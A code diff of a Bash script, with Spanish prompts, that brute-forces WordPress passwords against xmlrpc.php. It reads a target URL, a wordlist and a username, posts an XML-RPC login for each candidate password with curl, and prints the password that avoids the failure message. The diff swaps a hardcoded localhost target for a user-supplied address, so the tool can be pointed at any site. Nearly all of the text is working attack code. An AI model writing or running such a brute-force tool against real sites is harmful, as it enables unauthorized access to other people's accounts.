@@ -1,7 +1,7 @@
 #!/bin/bash
-
+echo -e "Dirección del sitio web" && read direccion
 echo -e "Ruta del diccionario" && read ruta
-echo -e "Usuario a realizar fuerza bruta" && user
+echo -e "Usuario a realizar fuerza bruta" && read user
 
 PasswordBreaker(){
 password=$1
@@ -19,7 +19,7 @@ file="""
 
 echo $file > file.xml
 
-respuesta=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml)
+respuesta=$(curl -X POST "${direccion}" -d@file.xml)
 
 if [ ! "$(echo $respuesta | grep 'Incorrect username or password.' 2>/dev/null)" ]; then
 echo "La contraseña del usuario $user es $password"
